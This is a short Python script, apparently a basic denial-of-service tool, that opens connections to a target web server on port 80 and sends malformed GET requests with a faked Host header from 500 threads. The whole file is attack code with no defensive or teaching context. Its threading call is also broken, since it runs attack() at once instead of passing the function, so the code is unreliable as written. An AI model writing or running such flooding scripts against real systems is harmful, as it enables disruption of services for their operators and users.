import socket
import threading

target= ''
port = 80
fake_ip=''

already_connected = 0
def attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
    s.close()

for i in range(500):
    thread = threading.Thread(target=attack())
    thread.start()